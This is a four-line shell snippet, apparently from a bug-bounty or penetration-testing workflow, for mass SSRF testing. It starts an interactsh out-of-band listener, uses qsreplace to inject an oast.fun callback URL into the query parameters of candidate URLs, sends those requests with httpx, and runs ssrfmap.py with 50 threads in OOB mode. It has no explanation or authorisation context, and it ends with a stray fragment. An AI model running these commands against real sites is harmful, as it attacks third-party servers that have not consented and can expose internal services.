interactsh-client -o oob.txt
cat ssrf_candidates.txt | qsreplace "http://<tu-id>.oast.fun" | httpx -silent
python3 ssrfmap.py -l ssrf_candidates.txt -t 50 --oob
ssrfmap
